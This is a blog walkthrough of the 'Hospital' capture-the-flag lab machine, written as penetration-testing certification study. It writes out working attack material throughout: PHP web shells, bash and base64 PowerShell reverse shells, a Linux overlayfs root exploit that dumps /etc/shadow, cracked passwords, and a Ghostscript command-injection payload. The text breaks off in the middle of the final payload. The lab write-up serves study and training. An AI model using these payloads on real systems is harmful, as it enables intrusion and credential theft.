---
layout: post
title: "hospital"
date: 2025-10-16 
categories: CPTS Playlist
---
# hospital

# Summary

- File upload vulnerability; use ffuf to fuzz for accepted exetensions; upload .phar file
- php had disable_functions enabled, system disabled; used p0wny-shell or php version of dfunc_bypasser to find accepted dangerous function; popen to get reverse shell
- kernel exploit on Linux to get root shell; output /etc/shadow to crack drwilliams’ password
- password reused on mail application; email requesting GhostScript file
- command injection vulnerability in GhostScript to inject PowerShell one-liner to get reverse shell on Windows machine as drbrown
- writable web root in C:\xampp\htdocs; inject webshell e.g. custom or p0wny-shell to find out service is running as NT Authority; Administrator
- Second way; qwinsta to find logged on user drbrown; msfvenom to generate meterpreter payload; get meterpreter session and migrate process to session 1, to start keylogger and dump the keys to reveal administrator password

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/hospital 10.10.11.241

22/tcp   open   ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open   domain            Simple DNS Plus
88/tcp   open   kerberos-sec      Microsoft Windows Kerberos (server time: 2025-10-15 22:46:29Z)
135/tcp  open   msrpc             Microsoft Windows RPC
139/tcp  open   netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open   ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open   ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:
|_  http/1.1
445/tcp  open   microsoft-ds?
464/tcp  open   kpasswd5?
593/tcp  open   ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open   ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open   msmq?
2103/tcp open   msrpc             Microsoft Windows RPC
2105/tcp open   msrpc             Microsoft Windows RPC
2107/tcp open   msrpc             Microsoft Windows RPC
2179/tcp open   vmrdp?
3268/tcp open   ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open   globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open   ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-10-14T22:43:34
|_Not valid after:  2026-04-15T22:43:34
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-15T22:47:18+00:00
5985/tcp open   http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp closed http-proxy
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

```

From the look of the open ports and services, this seems to be a domain controller. One port that we did not expect is port 22, which normally is for Linux. We also get the domain name, let’s add that to our /etc/hosts:

```bash
10.10.11.241 hospital.htb DC.hospital.htb
```

## SMB

Let’s see if null authentication is enabled. 

```bash
nxc smb 10.10.11.241 -u 'any' -p '' --shares

SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [-] hospital.htb\any: STATUS_LOGON_FAILURE 

smbclient -N -L //10.10.11.241

session setup failed: NT_STATUS_ACCESS_DENIED

```

Denied. 

## LDAP

Let’s attempt to bind to LDAP

```bash
ldapsearch -x -H ldap://10.10.11.241 -s base -b "" namingContexts

# search result
search: 2
result: 0 Success

```

## RPC

```bash
rpcclient -U'%' 10.10.11.241
```

## HTTPS

Let’s visit the web page now:

![image.png]({{ site.baseurl }}/assets/hospital/image.png)

We get a login form. Let’s try default credentials admin:admin. Denied. Let’s see if this form is vulnerable to SQL injection. Denied. 

![image.png]({{ site.baseurl }}/assets/hospital/image%201.png)

We see the technology framework used is RoundCube. Let’s search up exploits. We see 

that it is vulnerable to stored XSS with a crafted SVG. Not too useful.

![image.png]({{ site.baseurl }}/assets/hospital/image%202.png)

```bash
https://hospital.htb/
```

Let’s fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://hospital.htb/FUZZ -fs 303

licenses                [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 28ms]
installer               [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 32ms]
phpmyadmin              [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 28ms]
                        [Status: 200, Size: 5322, Words: 366, Lines: 97, Duration: 151ms]
Installer               [Status: 301, Size: 343, Words: 22, Lines: 10, Duration: 50ms]
server-status           [Status: 403, Size: 422, Words: 37, Lines: 12, Duration: 29ms]

```

## HTTP port 8080

Nothing interesting. We have an attack angle, but we still need the ability to upload svg. Let’s move onto the next web port, even though the port 8080 says it’s closed on nmap, let’s view it on the browser regardless:

```bash
http://hospital.htb:8080
```

![image.png]({{ site.baseurl }}/assets/hospital/image%203.png)

It seems we can make an account. Let’s do that. After registration, let’s login:

![image.png]({{ site.baseurl }}/assets/hospital/image%204.png)

Let’s see what files we can upload.

Let’s upload a test file.

![image.png]({{ site.baseurl }}/assets/hospital/image%205.png)

We successfully uploaded a png file. 

Let’s fuzz for subdir from this site:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://hospital.htb:8080/FUZZ -ic -e .php

login.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 27ms]
register.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 20ms]
uploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 26ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 24ms]
images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 2457ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2471ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 17ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
success.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 23ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 22ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 27ms]
```

There is an uploads dir. Let’s see if we can view our image on web:

```bash
http://hospital.htb:8080/uploads/test.png
```

![image.png]({{ site.baseurl }}/assets/hospital/image%206.png)

We can view our image. Now let’s see if we can upload php files. 

![image.png]({{ site.baseurl }}/assets/hospital/image%207.png)

From the redirect, we can see it got sent to failed.php instead of success.php.

We can fuzz permitted for permitted file extensions with ffuf. First, save our POST request to a file e.g. req.txt. Then add our fuzzing parameter at the extension.

![image.png]({{ site.baseurl }}/assets/hospital/image%208.png)

Now let’s fuzz

```bash
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -mr success

.mdb                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 349ms]
.pl                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3935ms]
.bat                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4193ms]
.c                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4193ms]
.phar                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3946ms]
.sh                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3926ms]
.hta                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3955ms]
.nsf                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4162ms]
.rb                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 3925ms]
.exe                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4623ms]
.pht                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 242ms]
```

Here we use -mr to filter for the success condition; it will look in the header and match responses with success.

Now let’s make a php web shell:

```bash
<?php system($_REQUEST["cmd"]); ?>
```

After uploading our web.phar file:

![image.png]({{ site.baseurl }}/assets/hospital/image%209.png)

Now let’s visit our webshel:

```bash
http://hospital.htb:8080/uploads/web.phar?cmd=id
```

We do not see any output.

![image.png]({{ site.baseurl }}/assets/hospital/image%2010.png)

We know our php code is executing since a blank page is returning. Let’s check phpinfo and see if system is a disabled function. First capture our webshell in burp repeater, change the file content to the following:

```bash
<?php phpinfo(); ?>
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2011.png)

![image.png]({{ site.baseurl }}/assets/hospital/image%2012.png)

At this point, we can just upload p0wny shell webshell, this automatically bypasses disable_functions. Just change the name to powny.phar to upload.

![image.png]({{ site.baseurl }}/assets/hospital/image%2013.png)

Another way of manually bypassing this is using part of dfunc_bypasser. IPPSEC’s version of php dfunc_bypasser is better as it does not give you syntax error from python2. A version of the code is here:

```bash
<?php

$dangerous_functions = array(
    'pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited',
    'pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus',
    'pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler',
    'pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask',
    'pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority',
    'pcntl_setpriority','pcntl_async_signals','error_log','system','exec',
    'shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail'
);

foreach ($dangerous_functions as $f) {
    if (function_exists($f)) {
        echo $f . " exists<br>\n";
    }
}
?>

```

We upload this file on repeater, we can name the filename any name as long as it ends in .phar. Now, to show dangerous functions that are allowed on the web server, we just visit our .phar page:

Upload:

![image.png]({{ site.baseurl }}/assets/hospital/image%2014.png)

Visit:

![image.png]({{ site.baseurl }}/assets/hospital/image%2015.png)

Now we can just choose any one of these dangerous functions and search for e.g. php popen run commands. We find the php manual, find one with output as well e.g.: https://www.php.net/manual/en/function.popen.php

We can test if we need full path by just typing the binary in the executable, without giving full path, if it returns, we know we don’t need full path: e.g. popen('ls 2>&1', 'r'). Now if we want a reverse shell:

```bash
<?php
error_reporting(E_ALL);

/* Add redirection so we can get stderr. */
$handle = popen('bash -c "bash -i &> /dev/tcp/10.10.16.4/4444 0>&1"', 'r');
echo "'$handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);
?>

```

![image.png]({{ site.baseurl }}/assets/hospital/image%2016.png)

Now visiting our page, we have shell:

![image.png]({{ site.baseurl }}/assets/hospital/image%2017.png)

## Foothold

First, let’s upgrade our shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let’s enumerate. Going back to the webroot, we find config.php:

```bash
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');

```

Let’s logon to mysql:

```bash
mysql -h localhost -u root -p
```

```bash
show databases;

+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

use hospital;

show tables;

+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+

select * from users;

+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | bob      | $2y$10$f6DUosvRArMzJ9ItyihhduYc1HTDmLBXlseZTe8GVA6rMdsJarm8G | 2025-10-15 23:32:22 |
+----+----------+--------------------------------------------------------------+---------------------+

```

Let’s try and crack this in the background whilst we enumerate. First save the file hashes in a file:

```bash
admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
```

Now use hashcat, this looks like bcrypt:

```bash
.\hashcat.exe -m 3200 ..\hashes.txt ..\rockyou.txt --user

admin:123456
patient:patient
```

Let’s logon to admin on the web.

![image.png]({{ site.baseurl }}/assets/hospital/image%2018.png)

Same page. Let’s see if the same password is used on the roundcube application

Did not work.

We don’t see much enumerating the host. Let’s upload linpeas:

```bash
#INTERESTING OUTPUTS
Linux version 5.19.0-35-generic 

╔══════════╣ Sudo version                                                                                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                 
Sudo version 1.9.13p1  

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.5.2  netmask 255.255.255.0  broadcast 192.168.5.255
        inet6 fe80::215:5dff:fe00:8a02  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:00:8a:02  txqueuelen 1000  (Ethernet)
        RX packets 702593  bytes 155367318 (155.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 687304  bytes 330276094 (330.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

╔══════════╣ Users with console
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
root:x:0:0:root:/root:/bin/bash

```

Since there are no attack angles, let’s search up kernel exploits related to our version. We find this reddit post:

https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2019.png)

It works. Let’s output the /etc/shadow file:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /etc/shadow")'

<SNIP>
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::

###Or we get just spawn /bin/bash as root

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'

```

We cannot crack root’s hash, as it’s a using yescrypt; hashcat does not support. However, drwilliams is using sha512. Let’s attempt to crack their hash. First save the hash part (without the username) and the trailing part into a file. 

```bash
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/
```

Then:

```bash
.\hashcat.exe -m 1800 ..\hashes.txt ..\rockyou.txt

drwilliams:qwe123!@#
```

Now, let’s ssh in.

```bash
ssh drwilliams@hospital.htb
```

We are in.

![image.png]({{ site.baseurl }}/assets/hospital/image%2020.png)

There aren’t anything interesting in the home dir. Let’s see if we can logon as drwilliams to the hospital web mail. We are in:

![image.png]({{ site.baseurl }}/assets/hospital/image%2021.png)

![image.png]({{ site.baseurl }}/assets/hospital/image%2022.png)

GhostScript is mentioned here. Let’s search up exploit pertaining. We found this: https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

It seems we can inject commands into the eps file, which will execute upon the user opening it. Let’s clone the repo:

```bash
#Inject malicious custom payload ("calc") to an existing file called file.eps (pops up a new calculator on Windows)

python3 CVE_2023_36664_exploit.py --inject --payload "calc" --filename file.eps
```

Let’s use the nishange Invoke-PowerShellTcpOneLine.ps1 reverese shell one liner. First change the IP and ports to what we desire. Now convert it to little endian format and encode it in base64:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANAAnACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

Now let’s create our exploit file:

```bash
python3 CVE_2023_36664_exploit.py --inject --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANAAnACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=" --filename file.eps

[+] Payload successfully injected into file.eps.
```

Now let’s start a listener, and send our malicious eps file:

```bash
nc -lvnp 9001
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2023.png)

Change the priority to highest, and click send.

After a while, we get a shell back:

![image.png]({{ site.baseurl }}/assets/hospital/image%2024.png)

## Privilege Escalation Windows

First, let’s check our privileges:

![image.png]({{ site.baseurl }}/assets/hospital/image%2025.png)

Let’s also check if this is a domain joined machine. Looking at ipconfig, it seems we are on the DC:

```bash
ipconfig /all                                                                                                                     
                                                                                                                                               
Windows IP Configuration                                                                                                                       
                                                                                                                                               
   Host Name . . . . . . . . . . . . : DC                                                                                                      
   Primary Dns Suffix  . . . . . . . : hospital.htb                                                                                            
   Node Type . . . . . . . . . . . . : Hybrid                                                                                                  
   IP Routing Enabled. . . . . . . . : No                                                                                                      
   WINS Proxy Enabled. . . . . . . . : No                                                                                                      
   DNS Suffix Search List. . . . . . : hospital.htb 
```

Also we are a domain account:

```bash
PS C:\Users> whoami /upn
drbrown@hospital.htb
PS C:\Users> whoami
hospital\drbrown
PS C:\Users> hostname
DC

```

Let’s upload SharpHound and map out the AD.

```bash
iwr http://10.10.16.4:8001/SharpHound/SharpHound.exe -OutFile SharpHound.exe
```

Let’s execute it:

```bash
.\SharpHound.exe -c all
```

Now let’s transfer it back with smb server:

```bash
#on attack
sudo impacket-smbserver share -smb2support . -user test -password test

#on target
net use \\10.10.16.4\share /user:test test
copy 20251016111937_BloodHound.zip  \\10.10.16.4\share\bh.zip

```

Now let’s upload it to bloodhound:

```bash
sudo neo4j start
bloodhound
```

Now searching up drbrown:

![image.png]({{ site.baseurl }}/assets/hospital/image%2026.png)

We have PSRemote rights and RDP rights. We are also part of the Remote Management Users group. 

Nothing too interesting. When we look in our /documents folder, we find a ghostscript.bat:

```bash
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"

```

We get the password for drbrown. Let’s verify it with nxc:

```bash
nxc smb hospital.htb -u drbrown -p 'chr!$br0wn' --shares

SMB         10.10.11.241    445    DC               [+] hospital.htb\drbrown:chr!$br0wn
SMB         10.10.11.241    445    DC               [*] Enumerated shares
SMB         10.10.11.241    445    DC               Share           Permissions     Remark
SMB         10.10.11.241    445    DC               -----           -----------     ------
SMB         10.10.11.241    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.241    445    DC               C$                              Default share
SMB         10.10.11.241    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.241    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.241    445    DC               SYSVOL          READ            Logon server share

```

It worked. We now have persistence on the machine. Let’s login via evil-winrm:

```bash
evil-winrm -u drbrown -p 'chr!$br0wn' -i hospital.htb
```

Enumerating through, we find a xampp directory. We know the equivalence of /var/www/html is xampp/htdocs. Therefore, we we create a page with web shell here. Note that since we are on PowerShell, we write stuff in little endian format, so we have to convert it to utf-8:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' | Out-File -Encoding UTF8 shell.php

<?php system($_REQUEST["cmd"]); ?>
```

Now let’s visit the web page:

```bash
https://hospital.htb/shell.php?cmd=whoami
```

![image.png]({{ site.baseurl }}/assets/hospital/image%2027.png)

Now, we can get a reverse shell as system; easier to send in a POST request; capture the request in burp repeater and url encode the following:

```bash
cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANAAnACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAY